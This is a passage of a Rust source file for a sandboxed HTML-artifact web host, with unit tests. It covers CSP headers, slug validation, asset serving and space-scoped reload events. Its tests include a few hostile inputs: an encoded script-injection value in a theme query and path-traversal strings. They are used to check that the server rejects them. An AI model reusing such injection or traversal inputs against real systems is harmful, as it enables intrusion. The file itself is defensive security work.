//! v0.2 HTML-artifact host — **Wave 1 security gate + Wave 2a space model**.
//!
//! Stands up the null-origin sandboxed iframe host and its security contract
//! (Wave 1), and on top of it the **space model + live directory serving**
//! (Wave 2a): a directory of files becomes a live, safely-served space. See
//! `issues/html-artifact-host-rewrite/{design,plan,wave-plan}.md`.
//!
//! URL topology (design.md §/plan.md §3):
//! * `GET /{space}/`               — space entry (trusted shell for the home artifact)
//! * `GET /{space}/{slug}`         — trusted shell framing the artifact
//! * `GET /{space}/_c/{slug}`      — raw artifact document (carries the sandbox CSP)
//! * `GET /{space}/assets/{*path}` — a space's static assets (MIME + size limits)
//! * `GET /_gp/reload`             — SSE stream that fires on a filesystem change
//! * `GET /_gp/v1/*`              — pinned base libraries (Wave 2b fills content)
//!
//! Wave 2a serves two kinds of space uniformly through one set of handlers:
//! * a **live directory snapshot** (`space::Snapshot`, swapped atomically on
//!   rescan), and
//! * the built-in **`demo` fixtures** — the deliberately-hostile Wave 1 probes,
//!   kept as the security regression suite. A request resolves against the live
//!   snapshot first; only spaces absent from it fall back to the fixtures.

pub mod fixtures;
pub mod guards;
pub mod headers;
pub mod render;
pub mod shell;
pub mod space;
pub mod wrap;

use std::convert::Infallible;
use std::sync::{Arc, RwLock};

use axum::{
    Router,
    extract::{Path, Query, State},
    http::{HeaderMap, HeaderValue, StatusCode, header},
    response::{
        Html, IntoResponse, Response,
        sse::{Event, KeepAlive, Sse},
    },
    routing::get,
};
use serde::Deserialize;
use tokio::sync::broadcast;
use tokio_stream::{StreamExt, wrappers::BroadcastStream};

use glasspad::security::token;
use space::Snapshot;

/// Which origin(s) the artifact CSP names, and the URL mount prefix the trusted
/// shell emits. `'self'` is meaningless under the artifact's null origin, so the
/// CSP must name explicit origins; loopback names both loopback spellings, the
/// hosted run mode names its single public origin. This is a *parameterization*
/// of the frozen boundary — the sandbox tokens and `connect-src 'none'` egress
/// closure are identical either way (see `headers::artifact_csp_from_origins`).
#[derive(Clone, Debug)]
pub enum OriginPolicy {
    /// The loopback dev server: CSP names `127.0.0.1:port` + `localhost:port`,
    /// shell URLs are root-absolute (no mount prefix).
    Loopback { port: u16 },
    /// The hosted share server: CSP names the single public `origin`
    /// (`scheme://host[:port]`), shell content/nav URLs carry the `/p` mount.
    Public { origin: String },
}

/// A server→shell push carried on the one live-reload SSE stream (`/_gp/reload`).
/// The shell's single `EventSource` multiplexes two signals so B2 multi-round does
/// **not** invent a new push channel (design.md / models-comparison.md §B2):
///
/// * [`ReloadEvent::Reload`] — a **full shell reload** (the loopback dev file-watch:
///   nav, titles, or the artifact set may all have changed). The shell responds with
///   `location.reload()`, exactly as it did before B2.
/// * [`ReloadEvent::Round`] — one artifact advanced to a **new content round** (the
///   B2 push): the shell swaps *that* space's framed artifact **in place** (a fresh
///   content-route fetch under the identical frozen CSP), keeping the live page — no
///   full reload. Delivery is **scoped server-side** to the `space` the connection
///   named (`/_gp/reload?space=<slug>`), so a round pushed to one hosted page is never
///   delivered to another page's shell — the global broadcast can't leak one tenant's
///   capability slug to another's connection.
///
/// The event carries **no URL** — only a `space`/`content_version`/`round` echo — so
/// a round push can at most make a shell re-fetch its *own* current content route; it
/// can never redirect it.
#[derive(Clone, Debug)]
pub enum ReloadEvent {
    /// Reload the whole shell (dev file-watch: nav/title/artifact-set may differ).
    Reload,
    /// Swap `space`'s framed artifact in place — it advanced to a new round.
    Round {
        space: String,
        content_version: String,
        round: u64,
    },
}

/// Shared state for the artifact host: the origin policy (which origin the CSP
/// names + the shell's URL mount, see [`OriginPolicy`]), the live **snapshot**
/// (immutable, swapped atomically so a half-written file is never served), and a
/// broadcast channel the filesystem watcher pokes to drive SSE reloads.
pub struct ArtifactHost {
    origins: OriginPolicy,
    /// URL prefix the shell prepends to `/{space}/…` content + nav links (never to
    /// `/_gp/*`). Empty for loopback, `/p` for the hosted mount.
    mount: String,
    snapshot: RwLock<Arc<Snapshot>>,
    reload_tx: broadcast::Sender<ReloadEvent>,
    /// Host-level default emoji favicon for the OUTER shell document. Loopback sets
    /// it once from the repo `.glasspad.yaml` (one config per served repo); the
    /// hosted (multi-tenant) mode leaves it `None` and carries the favicon per-space
    /// on [`Space`] instead. Resolved per-space-wins in [`render_shell`]. Already
    /// validated ([`crate::favicon::validate`]); `None` → the built-in default.
    favicon: Option<String>,
    /// The return-channel submission store, for the loopback run mode. `None` when
    /// no return channel is wired (fixture-only test hosts, or a store that failed
    /// to open). The hosted run mode carries its own store on `HostedState` instead.
    submissions: Option<Arc<crate::submissions::SubmissionStore>>,
}

impl ArtifactHost {
    /// The loopback dev host (unchanged behavior): CSP names both loopback
    /// origins, shell URLs are root-absolute.
    pub fn new(port: u16) -> Self {
        Self::with_origins(OriginPolicy::Loopback { port }, String::new())
    }

    /// The hosted share host: the artifact CSP names `origin` (the operator's
    /// `--public-host`) and the shell emits `{mount}/{space}/…` links.
    pub fn new_public(origin: String, mount: String) -> Self {
        Self::with_origins(OriginPolicy::Public { origin }, mount)
    }

    fn with_origins(origins: OriginPolicy, mount: String) -> Self {
        let (reload_tx, _) = broadcast::channel(16);
        Self {
            origins,
            mount,
            snapshot: RwLock::new(Arc::new(Snapshot::empty())),
            reload_tx,
            submissions: None,
            favicon: None,
        }
    }

    /// Attach a return-channel submission store (builder; loopback run mode).
    pub fn with_submissions(mut self, subs: Arc<crate::submissions::SubmissionStore>) -> Self {
        self.submissions = Some(subs);
        self
    }

    /// Set the host-level default emoji favicon (builder; loopback run mode). The
    /// value must already be validated ([`crate::favicon::validate`]); `None` keeps
    /// the built-in default.
    pub fn with_favicon(mut self, favicon: Option<String>) -> Self {
        self.favicon = favicon;
        self
    }

    /// The host-level default favicon emoji, if one is configured.
    pub fn favicon(&self) -> Option<&str> {
        self.favicon.as_deref()
    }

    /// The attached submission store, if a return channel is wired.
    pub fn submissions(&self) -> Option<&Arc<crate::submissions::SubmissionStore>> {
        self.submissions.as_ref()
    }

    /// The concrete origins this host answers under, for the submit CSRF check.
    /// Loopback names both loopback spellings; the hosted mode names its single
    /// public origin (the hosted submit handler uses `public_origin` directly, so
    /// this is exercised on the loopback path).
    pub fn origin_list(&self) -> Vec<String> {
        match &self.origins {
            OriginPolicy::Loopback { port } => vec![
                format!("http://127.0.0.1:{port}"),
                format!("http://localhost:{port}"),
            ],
            OriginPolicy::Public { origin } => vec![origin.clone()],
        }
    }

    /// The space-separated origin list the artifact CSP names for this host.
    fn csp_origins(&self) -> String {
        match &self.origins {
            OriginPolicy::Loopback { port } => headers::self_origins(*port),
            OriginPolicy::Public { origin } => origin.clone(),
        }
    }

    /// Build the artifact-content CSP for this host's origin policy. Delegates to
    /// the one frozen builder — the hosted mode changes only the named origin.
    pub fn artifact_csp(&self, allow_eval: bool) -> String {
        headers::artifact_csp_from_origins(&self.csp_origins(), allow_eval)
    }

    /// The URL mount prefix the shell prepends to content/nav links (`""` loopback,
    /// `/p` hosted).
    pub fn mount(&self) -> &str {
        &self.mount
    }

    /// Cheap, lock-brief read of the current immutable snapshot.
    pub fn snapshot(&self) -> Arc<Snapshot> {
        self.snapshot
            .read()
            .expect("snapshot lock poisoned")
            .clone()
    }

    /// Atomically install a freshly-built snapshot. Readers in flight keep the
    /// old `Arc`; new readers see the new one — never a half-built mix.
    pub fn swap(&self, snap: Snapshot) {
        *self.snapshot.write().expect("snapshot lock poisoned") = Arc::new(snap);
    }

    /// Subscribe to reload notifications (one receiver per open SSE connection).
    pub fn subscribe(&self) -> broadcast::Receiver<ReloadEvent> {
        self.reload_tx.subscribe()
    }

    /// Fire a **full shell reload** to every connected SSE client (called after an
    /// atomic snapshot swap by the loopback file-watch — nav/titles may have changed).
    pub fn notify_reload(&self) {
        let _ = self.reload_tx.send(ReloadEvent::Reload);
    }

    /// Push a **round swap** for `space` to connected shells (B2 multi-round): the
    /// artifact advanced to `round` with the given `content_version`. Reuses the
    /// live-reload SSE carrier; the shell swaps that space's framed artifact in place
    /// (a fresh content-route fetch under the frozen CSP) rather than reloading. A
    /// send error just means no shell is connected — the new round is already the
    /// served body, so a later shell load / reconnect resumes at it.
    pub fn notify_round(&self, space: &str, content_version: &str, round: u64) {
        let _ = self.reload_tx.send(ReloadEvent::Round {
            space: space.to_string(),
            content_version: content_version.to_string(),
            round,
        });
    }
}

/// Build the artifact-host router over a shared [`ArtifactHost`]. Finalized to
/// `Router<()>` so it merges into the main server router. Control-plane guards
/// (§5) are applied by the caller in `server::run` across the whole app.
pub fn router(host: Arc<ArtifactHost>) -> Router {
    spaces_router(host.clone()).merge(gp_router(host))
}

/// Just the `/{space}/…` space routes (entry, shell, content, assets), finalized
/// over `host`. Split out so the hosted run mode can `nest` these under its `/p`
/// mount while serving `/_gp/*` ([`gp_router`]) at the origin root — the loopback
/// [`router`] merges the two at root, unchanged. The shell emits `{mount}/…` links
/// so the nested paths resolve correctly (see `ArtifactHost::mount`).
pub fn spaces_router(host: Arc<ArtifactHost>) -> Router {
    Router::new()
        .route("/{space}/", get(space_entry))
        .route("/{space}/_c/{slug}", get(artifact_content))
        .route("/{space}/assets/{*path}", get(space_asset))
        .route("/{space}/{slug}", get(shell_page))
        .with_state(host)
}

/// The `/_gp/*` base-library + reload routes, finalized over `host`. Always mounted
/// at the origin root in both run modes (the wrap + shell reference `/_gp/v1/*` and
/// `/_gp/reload` as root-absolute paths).
pub fn gp_router(host: Arc<ArtifactHost>) -> Router {
    Router::new()
        .route("/_gp/reload", get(reload_stream))
        .route("/_gp/v1/{*path}", get(gp_asset))
        .with_state(host)
}

// --- Path/slug validation -------------------------------------------------

/// Canonical slug/space grammar. Lowercase, digit, hyphen; must start with an
/// alphanumeric; bounded length. Reserved names are rejected separately. Public
/// so the CLI (`glasspad create`/`open`) validates slugs/space names against the
/// exact same grammar the router and scanner enforce.
pub fn valid_name(s: &str) -> bool {
    let bytes = s.as_bytes();
    if bytes.is_empty() || bytes.len() > 64 {
        return false;
    }
    let first = bytes[0];
    if !(first.is_ascii_lowercase() || first.is_ascii_digit()) {
        return false;
    }
    bytes
        .iter()
        .all(|&b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

pub const RESERVED: &[&str] = &["_gp", "_c", "assets", "api"];

/// A valid space name: the slug grammar plus a not-a-reserved-name check. Public
/// so the CLI rejects the same names the router does, with one shared definition.
pub fn valid_space(s: &str) -> bool {
    valid_name(s) && !RESERVED.contains(&s)
}

// --- Live-space + fixtures resolution -------------------------------------

/// A resolved artifact: its raw HTML plus (for live spaces) the parsed title.
struct Hit {
    html: String,
    title: Option<String>,
}

// Each handler captures ONE `Arc<Snapshot>` up front and resolves everything
// against it, so a mid-request watcher swap can never mix a title from one
// snapshot with nav from another. A space present in the snapshot is served
// **only** from it (a real space never leaks the built-in `demo` probes); spaces
// absent from the snapshot fall back to the fixtures registry (the regression
// suite). Live-slug misses do NOT fall through to fixtures.

/// Resolve an artifact against a captured snapshot.
fn find_artifact(snap: &Snapshot, space: &str, slug: &str) -> Option<Hit> {
    if let Some(sp) = snap.space(space) {
        return sp.artifact(slug).map(|a| Hit {
            html: a.html.clone(),
            title: Some(a.title.clone()),
        });
    }
    fixtures::get(space, slug).map(|f| Hit {
        html: f.html.to_string(),
        title: None,
    })
}

/// Ordered `(slug, title)` nav table for a space (live nav order + resolved
/// titles, else the fixtures order with titles parsed from the fixture HTML). The
/// titles are artifact-derived text the trusted shell inserts via `textContent`
/// (never `innerHTML`); a fixture with no resolvable `<title>`/`<h1>` falls back
/// to its slug so the nav always has a label.
fn space_nav(snap: &Snapshot, space: &str) -> Vec<(String, String)> {
    if let Some(sp) = snap.space(space) {
        return sp
            .nav
            .iter()
            .map(|slug| {
                let title = sp
                    .artifact(slug)
                    .map(|a| a.title.clone())
                    .unwrap_or_else(|| slug.clone());
                (slug.clone(), title)
            })
            .collect();
    }
    fixtures::slugs(space)
        .into_iter()
        .map(|slug| {
            let title = fixtures::get(space, slug)
                .and_then(|f| space::resolve_title(f.html))
                .unwrap_or_else(|| slug.to_string());
            (slug.to_string(), title)
        })
        .collect()
}

/// Public artifact-body resolution (live snapshot first, else the demo fixtures) —
/// the **same seam** the content route uses. The return channel binds a submission's
/// content-version to this exact body, so a submit resolves an artifact wherever the
/// content route would serve one (a live space or the built-in fixtures).
pub fn resolve_artifact_html(snap: &Snapshot, space: &str, slug: &str) -> Option<String> {
    find_artifact(snap, space, slug).map(|h| h.html)
}

/// The home slug for `space` (live, else fixtures) — the default submit target when
/// the shell does not name a current slug. Public wrapper over [`space_home`].
pub fn resolve_home(snap: &Snapshot, space: &str) -> Option<String> {
    space_home(snap, space)
}

/// The home slug for a space (`index` > `home` > first in nav order).
fn space_home(snap: &Snapshot, space: &str) -> Option<String> {
    if let Some(sp) = snap.space(space) {
        return sp.home.clone();
    }
    let slugs = fixtures::slugs(space);
    if slugs.is_empty() {
        return None;
    }
    Some(if slugs.contains(&"index") {
        "index".to_string()
    } else {
        slugs[0].to_string()
    })
}

// --- Handlers -------------------------------------------------------------

#[derive(Deserialize, Default)]
struct ContentQuery {
    /// Diagnostic knob for the adversarial suite. `csp=noeval` serves the CSP
    /// **without** `'unsafe-eval'` — strictly tighter, never looser — so the
    /// suite can prove Vega-Lite's `new Function` truly needs it (design.md §4).
    /// Honored **only in debug builds**; release builds ignore it entirely so no
    /// query string can alter the frozen production policy.
    csp: Option<String>,
    /// Theme to inline into a **fragment-wrapped** artifact at serve time so a
    /// toggled theme survives an iframe swap with no FOUC (design.md §6). The
    /// value is allowlisted to `light`/`dark`/`auto` (`wrap::Theme::from_query`),
    /// so it can only pick one of three attribute values, never inject markup. It
    /// is inert for full-document artifacts (served verbatim).
    #[serde(rename = "gp_theme")]
    gp_theme: Option<String>,
}

/// Raw artifact document. Carries the sandbox CSP so a direct-open is sandboxed
/// too, plus the egress CSP and the hardening headers.
async fn artifact_content(
    State(host): State<Arc<ArtifactHost>>,
    Path((space, slug)): Path<(String, String)>,
    Query(q): Query<ContentQuery>,
) -> Response {
    if !valid_space(&space) || !valid_name(&slug) {
        return not_found();
    }
    let Some(hit) = find_artifact(&host.snapshot(), &space, &slug) else {
        return not_found();
    };
    // The noeval knob only *tightens* the policy, and only in debug builds; the
    // `&& cfg!(...)` keeps `q` referenced in every profile (no unused warning).
    let allow_eval = !(cfg!(debug_assertions) && q.csp.as_deref() == Some("noeval"));
    let csp = host.artifact_csp(allow_eval);

    let mut hmap = base_html_headers();
    hmap.insert(
        header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_str(&csp).expect("csp is header-safe ascii"),
    );
    for (name, value) in headers::hardening_headers() {
        hmap.insert(name, value);
    }
    // Fragment artifacts are wrapped (theme inlined for no-FOUC, base.css linked,
    // bridge.js injected); full documents are served verbatim. Wrapping runs under
    // the same frozen artifact CSP — it widens nothing (design.md §4/§6).
    let theme = wrap::Theme::from_query(q.gp_theme.as_deref());
    let body = wrap::render_artifact(&hit.html, theme);
    (hmap, Html(body)).into_response()
}

/// Trusted shell framing the artifact.
async fn shell_page(
    State(host): State<Arc<ArtifactHost>>,
    Path((space, slug)): Path<(String, String)>,
) -> Response {
    if !valid_space(&space) || !valid_name(&slug) {
        return not_found();
    }
    let snap = host.snapshot();
    let Some(hit) = find_artifact(&snap, &space, &slug) else {
        return not_found();
    };
    render_shell(
        &snap,
        host.mount(),
        &space,
        &slug,
        hit.title.as_deref(),
        host.favicon(),
    )
}

/// Space entry — the shell for the home artifact (`index`, else first slug).
async fn space_entry(State(host): State<Arc<ArtifactHost>>, Path(space): Path<String>) -> Response {
    if !valid_space(&space) {
        return not_found();
    }
    let snap = host.snapshot();
    let Some(home) = space_home(&snap, &space) else {
        return not_found();
    };
    let title = find_artifact(&snap, &space, &home).and_then(|h| h.title);
    render_shell(
        &snap,
        host.mount(),
        &space,
        &home,
        title.as_deref(),
        host.favicon(),
    )
}

/// Render the trusted shell. The outer document's favicon resolves **per-space
/// first** (`snap.space(space).favicon`, the hosted per-tenant emoji), then the
/// host-level default (`host_favicon`, loopback's repo `.glasspad.yaml`), then the
/// built-in default inside [`crate::favicon::link_tag`]. The favicon lives on this
/// outer document only — the sandboxed artifact iframe / content route is untouched.
fn render_shell(
    snap: &Snapshot,
    mount: &str,
    space: &str,
    slug: &str,
    title: Option<&str>,
    host_favicon: Option<&str>,
) -> Response {
    let nonce = token::generate_token();
    let nav = space_nav(snap, space);
    let nav_refs: Vec<(&str, &str)> = nav.iter().map(|(s, t)| (s.as_str(), t.as_str())).collect();
    let favicon = snap
        .space(space)
        .and_then(|s| s.favicon.as_deref())
        .or(host_favicon);
    let body = shell::render(
        mount,
        space,
        slug,
        title.unwrap_or(""),
        &nav_refs,
        &nonce,
        favicon,
    );
    let csp = headers::shell_csp(&nonce);

    let mut hmap = base_html_headers();
    hmap.insert(
        header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_str(&csp).expect("csp is header-safe ascii"),
    );
    // The shell must never be framed by anyone.
    hmap.insert(header::X_FRAME_OPTIONS, HeaderValue::from_static("DENY"));
    for (name, value) in headers::hardening_headers() {
        hmap.insert(name, value);
    }
    (hmap, Html(body)).into_response()
}

/// A space's static asset (`/{space}/assets/{*path}`). Path-traversal is
/// structurally impossible: the request path is grammar-checked into a key, and
/// that key must exact-match the pre-scanned asset map — which only ever holds
/// real, symlink-vetted files under the space root. MIME is detected at scan
/// time; every response carries `nosniff` **and** a `sandbox` CSP, so a hostile
/// SVG/HTML asset opened *as a document* runs script-less in a null origin (the
/// `sandbox` directive doesn't apply to subresource loads, so JS/CSS/img/fonts
/// still load into an artifact).
///
/// **No `Access-Control-Allow-Origin`.** A wildcard here would let *any* web page
/// the user has open `fetch()` a space's assets cross-origin (the request carries
/// a legitimate loopback `Host`, so `host_guard` passes) — a real exfil channel
/// that would defeat the egress boundary. Classic `<img>`/`<script src>`/`<link>`
/// subresources need no CORS, so artifacts still use their assets; cross-origin
/// fonts/modules/`fetch` from a null-origin artifact are intentionally NOT enabled
/// here (that needs a capability-scoped design, not a blanket `*`).
async fn space_asset(
    State(host): State<Arc<ArtifactHost>>,
    Path((space, path)): Path<(String, String)>,
) -> Response {
    if !valid_space(&space) {
        return not_found();
    }
    let Some(key) = space::asset_key_for_request(&path) else {
        return not_found();
    };
    let snap = host.snapshot();
    let Some(sp) = snap.space(&space) else {
        return not_found();
    };
    let Some(asset) = sp.asset(&key) else {
        return not_found();
    };

    let mut hmap = HeaderMap::new();
    hmap.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static(asset.content_type),
    );
    // Neutralize a hostile top-level asset document; harmless for subresources.
    hmap.insert(
        header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_static("sandbox"),
    );
    hmap.insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
    for (name, value) in headers::hardening_headers() {
        hmap.insert(name, value);
    }
    (hmap, asset.bytes.clone()).into_response()
}

/// Query for [`reload_stream`]: the shell names the **space** whose round pushes it
/// wants (`/_gp/reload?space=<slug>`). This is the **server-side isolation boundary**
/// for B2 round events: a `round` event is delivered **only** to a connection that
/// presented the exact matching space, so a client can observe round activity solely
/// for a page whose (capability) slug it already holds. Absent → the connection
/// receives full `reload` events only (the loopback dev file-watch), never any
/// `round` event — so a raw `GET /_gp/reload` cannot harvest other pages' slugs.
#[derive(Deserialize, Default)]
struct ReloadQuery {
    space: Option<String>,
}

/// SSE reload stream. The trusted shell opens an `EventSource` to this path
/// (its `connect-src 'self'` permits it) and reloads when the filesystem watcher
/// fires after an atomic snapshot swap. The **artifact** CSP is widened to name
/// exactly this loopback path (see `headers::artifact_csp_from_origins`) so a future in-frame
/// reload client can use it too — never to a foreign host, never a broad origin.
///
/// **Round events are space-scoped server-side** (`?space=<slug>`): a B2 `round`
/// event carries a page's capability slug, so it is emitted only on a connection
/// that already named that exact slug. Without this, the single global broadcast
/// would fan every page's round event (slug + content-version) out to every
/// connected shell — a cross-tenant capability/activity leak. Full `reload` events
/// carry no secret and are always emitted.
async fn reload_stream(
    State(host): State<Arc<ArtifactHost>>,
    Query(q): Query<ReloadQuery>,
) -> Sse<impl tokio_stream::Stream<Item = Result<Event, Infallible>>> {
    let rx = host.subscribe();
    // The one space this connection is authorized to observe round events for.
    let want: Option<Arc<str>> = q.space.as_deref().map(Arc::from);
    let stream = BroadcastStream::new(rx).filter_map(move |item| {
        let event = match item {
            // A B2 round push: deliver ONLY when this connection named the event's
            // own space — otherwise DROP it (no cross-page delivery). Name the event
            // `round`, stamp the round number as the SSE `id` (a valid per-space
            // cursor now the stream is scoped), and carry `{space, contentVersion,
            // round}` as data. A serialization failure (never, for two strings + an
            // int) degrades to a full reload rather than dropping the signal.
            Ok(ReloadEvent::Round {
                space,
                content_version,
                round,
            }) => {
                if want.as_deref() != Some(space.as_str()) {
                    return None;
                }
                Event::default()
                    .event("round")
                    .id(round.to_string())
                    .json_data(serde_json::json!({
                        "space": space,
                        "contentVersion": content_version,
                        "round": round,
                    }))
                    .unwrap_or_else(|_| Event::default().event("reload").data("1"))
            }
            // A full reload, or a lag error (a burst overran the channel — "something
            // changed"): a full shell reload is the safe superset, and carries no
            // page secret, so it is delivered to every connection.
            _ => Event::default().event("reload").data("1"),
        };
        Some(Ok::<Event, Infallible>(event))
    });
    Sse::new(stream).keep_alive(KeepAlive::default())
}

/// `/_gp/v1/*` pinned base libraries. Wave 1 ships stubs; classic `<script src>`
/// / `<link>` don't need CORS, but the requests that are CORS-gated get
/// `Access-Control-Allow-Origin: *` (no credentials) per design.md §4.
async fn gp_asset(Path(path): Path<String>) -> Response {
    // Positive-filter path guard: a pinned asset is a single flat filename of
    // `[a-z0-9._-]`. Rejecting everything else (rather than blocklisting `..`/`/`)
    // closes encoded-traversal and any future normalization surprise up front;
    // the exact-match `gp_asset` lookup below is the real allowlist.
    if path.is_empty()
        || !path.bytes().all(|b| {
            b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'.' | b'-' | b'_')
        })
    {
        return not_found();
    }
    let Some((content_type, body)) = fixtures::gp_asset(&path) else {
        return not_found();
    };
    let mut hmap = HeaderMap::new();
    hmap.insert(header::CONTENT_TYPE, HeaderValue::from_static(content_type));
    hmap.insert(
        header::ACCESS_CONTROL_ALLOW_ORIGIN,
        HeaderValue::from_static("*"),
    );
    for (name, value) in headers::hardening_headers() {
        hmap.insert(name, value);
    }
    (hmap, body).into_response()
}

// --- helpers --------------------------------------------------------------

fn base_html_headers() -> HeaderMap {
    let mut h = HeaderMap::new();
    h.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("text/html; charset=utf-8"),
    );
    // Dynamic, security-sensitive documents (per-response nonce, live artifact
    // content): never cache, so a stale CSP/nonce or a `?csp` variant can't be
    // replayed for a later request.
    h.insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
    h
}

fn not_found() -> Response {
    (StatusCode::NOT_FOUND, "not found").into_response()
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::Request;
    use space::{Artifact, Asset, Space};
    use tower::util::ServiceExt;

    fn empty_host() -> Arc<ArtifactHost> {
        Arc::new(ArtifactHost::new(3000))
    }

    async fn get_on(host: Arc<ArtifactHost>, path: &str) -> axum::http::Response<Body> {
        router(host)
            .oneshot(Request::get(path).body(Body::empty()).unwrap())
            .await
            .unwrap()
    }

    async fn get(path: &str) -> axum::http::Response<Body> {
        get_on(empty_host(), path).await
    }

    fn header<'a>(resp: &'a axum::http::Response<Body>, name: &str) -> &'a str {
        resp.headers()
            .get(name)
            .map(|v| v.to_str().unwrap())
            .unwrap_or("")
    }

    async fn body_string(resp: axum::http::Response<Body>) -> String {
        let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .unwrap();
        String::from_utf8_lossy(&bytes).into_owned()
    }

    // --- grammar --------------------------------------------------------

    #[test]
    fn slug_grammar() {
        assert!(valid_name("index"));
        assert!(valid_name("sales-q3"));
        assert!(valid_name("a"));
        assert!(!valid_name(""));
        assert!(!valid_name("-lead"));
        assert!(!valid_name("Upper"));
        assert!(!valid_name("has space"));
        assert!(!valid_name("dot.ext"));
        assert!(!valid_name("../etc"));
        assert!(!valid_name(&"x".repeat(65)));
    }

    #[test]
    fn reserved_spaces_rejected() {
        assert!(!valid_space("_gp"));
        assert!(!valid_space("_c")); // also fails grammar (underscore), belt+braces
        assert!(!valid_space("api"));
        assert!(!valid_space("assets"));
        assert!(valid_space("demo"));
    }

    // --- Wave 1 security contract (demo fixtures still served) -----------

    #[tokio::test]
    async fn content_route_carries_full_security_contract() {
        let resp = get("/demo/_c/index").await;
        assert_eq!(resp.status(), StatusCode::OK);
        let csp = header(&resp, "content-security-policy");
        assert!(
            csp.starts_with("sandbox allow-scripts"),
            "sandbox missing: {csp}"
        );
        // Egress stays fully closed — reload is shell-side, so the artifact needs
        // no connect authority. `/api/*`, canaries, and self all stay blocked.
        assert!(csp.contains("connect-src 'none'"), "egress open: {csp}");
        assert!(
            !csp.contains("/_gp/reload"),
            "SSE path leaked into artifact CSP: {csp}"
        );
        assert!(
            csp.contains("http://127.0.0.1:3000"),
            "host not named: {csp}"
        );
        assert!(csp.contains("'unsafe-eval'"), "eval frozen in: {csp}");
        assert_eq!(header(&resp, "x-content-type-options"), "nosniff");
        assert_eq!(header(&resp, "referrer-policy"), "no-referrer");
        assert!(header(&resp, "permissions-policy").contains("geolocation=()"));
        // noindex is a hosted-mode-only header; loopback serve must NOT carry it.
        assert!(
            resp.headers().get("x-robots-tag").is_none(),
            "loopback serve must not emit noindex"
        );
    }

    #[tokio::test]
    async fn content_route_noeval_knob_only_tightens() {
        let resp = get("/demo/_c/eval?csp=noeval").await;
        let csp = header(&resp, "content-security-policy");
        assert!(
            !csp.contains("'unsafe-eval'"),
            "noeval must drop eval: {csp}"
        );
        assert!(csp.starts_with("sandbox allow-scripts")); // still sandboxed
    }

    #[tokio::test]
    async fn shell_route_is_trusted_chrome_not_sandboxed() {
        let resp = get("/demo/index").await;
        assert_eq!(resp.status(), StatusCode::OK);
        let csp = header(&resp, "content-security-policy");
        assert!(
            csp.contains("require-trusted-types-for 'script'"),
            "TT off: {csp}"
        );
        assert!(
            !csp.contains("sandbox allow-scripts"),
            "shell must NOT self-sandbox"
        );
        assert_eq!(header(&resp, "x-frame-options"), "DENY");
        let html = body_string(resp).await;
        assert!(
            html.contains(r#"sandbox="allow-scripts allow-top-navigation-by-user-activation""#)
        );
        assert!(!html.contains("allow-same-origin"));
    }

    #[tokio::test]
    async fn space_entry_serves_home() {
        let resp = get("/demo/").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert!(body_string(resp).await.contains("/demo/_c/index"));
    }

    #[tokio::test]
    async fn gp_asset_stub_has_cors_and_nosniff() {
        let resp = get("/_gp/v1/charts.js").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert_eq!(header(&resp, "access-control-allow-origin"), "*");
        assert_eq!(header(&resp, "x-content-type-options"), "nosniff");
        assert!(header(&resp, "content-type").contains("javascript"));
    }

    #[tokio::test]
    async fn bridge_js_served_with_cors_and_nosniff() {
        let resp = get("/_gp/v1/bridge.js").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert_eq!(header(&resp, "access-control-allow-origin"), "*");
        assert_eq!(header(&resp, "x-content-type-options"), "nosniff");
        assert!(header(&resp, "content-type").contains("javascript"));
        assert!(body_string(resp).await.contains("navigate"));
    }

    // --- Wave 3b: fragment wrapping + bridge injection on the content route ----

    #[tokio::test]
    async fn fragment_artifact_is_wrapped_with_bridge() {
        // `nav-a` is a benign fragment fixture (no <!doctype>) → wrapped + bridged.
        let resp = get("/demo/_c/nav-a").await;
        assert_eq!(resp.status(), StatusCode::OK);
        // Still under the frozen artifact CSP — wrapping widens nothing.
        let csp = header(&resp, "content-security-policy");
        assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
        assert!(csp.contains("connect-src 'none'"));
        let body = body_string(resp).await;
        assert!(
            body.starts_with("<!doctype html>"),
            "not wrapped: {}",
            &body[..40.min(body.len())]
        );
        assert!(body.contains(r#"<script src="/_gp/v1/bridge.js" defer></script>"#));
        assert!(body.contains(r#"<link rel="stylesheet" href="/_gp/v1/base.css">"#));
        assert!(body.contains("Nav A")); // fragment body preserved
        assert!(body.contains(r#"data-theme="auto""#)); // default theme, no FOUC
    }

    #[tokio::test]
    async fn full_document_artifact_is_served_verbatim() {
        // `index` (HELLO) is a full document → NOT wrapped, no injected bridge.
        let resp = get("/demo/_c/index").await;
        let body = body_string(resp).await;
        assert!(
            !body.contains("/_gp/v1/bridge.js"),
            "full doc must not get a bridge"
        );
    }

    #[tokio::test]
    async fn fragment_theme_query_is_inlined_and_allowlisted() {
        let resp = get("/demo/_c/nav-a?gp_theme=dark").await;
        assert!(body_string(resp).await.contains(r#"data-theme="dark""#));
        // A hostile theme value collapses to the safe default; no markup escapes.
        let resp = get("/demo/_c/nav-a?gp_theme=%22%3E%3Cscript%3E").await;
        let body = body_string(resp).await;
        assert!(body.contains(r#"data-theme="auto""#));
        assert!(!body.contains("<script>alert"));
    }

    #[tokio::test]
    async fn reserved_and_bad_names_404() {
        assert_eq!(get("/api/index").await.status(), StatusCode::NOT_FOUND);
        assert_eq!(
            get("/demo/_c/Bad%20Slug").await.status(),
            StatusCode::NOT_FOUND
        );
        assert_eq!(
            get("/demo/nonexistent").await.status(),
            StatusCode::NOT_FOUND
        );
        assert_eq!(
            get("/_gp/v1/../secret").await.status(),
            StatusCode::NOT_FOUND
        );
    }

    // --- Wave 2a: live space serving ------------------------------------

    fn host_with_space(name: &str, space: Space) -> Arc<ArtifactHost> {
        let host = Arc::new(ArtifactHost::new(3000));
        let mut snap = Snapshot::empty();
        snap.spaces.insert(name.to_string(), space);
        host.swap(snap);
        host
